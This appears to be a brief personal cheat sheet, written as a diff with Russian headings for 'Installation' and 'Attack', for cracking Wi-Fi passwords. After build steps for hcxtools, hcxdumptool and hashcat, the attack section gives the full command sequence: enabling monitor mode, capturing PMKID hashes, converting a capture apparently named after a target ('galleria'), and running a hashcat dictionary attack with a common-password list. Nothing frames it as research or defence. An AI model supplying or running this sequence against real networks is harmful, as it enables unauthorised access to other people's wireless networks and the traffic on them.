@@ -1,0 +1,18 @@
+Установка
+git clone https://github.com/ZerBea/hcxtools.git
+cd hcxtools
+apt-get install pkg-config libcurl4-openssl-dev libssl-dev zlib1g-dev
+make
+make install (as super user)
+cd ..
+git clone https://github.com/ZerBea/hcxdumptool.git
+cd hcxdumptool
+make
+make install
+apt install hashcat
+
+Атака
+airmon-ng start wlan0
+hcxdumptool -i wlan0mon -c <channel> -o <output file>.pcapng --enable_status=1
+hcxpcaptool -E essidlist -I identitylist -U usernamelist -o galleriaHC.16800 galleria.pcapng
+hashcat -m 16800 galleriaHC.16800 -a 0 --kernel-accel=1 -w 4 --force 'topwifipass.txt'
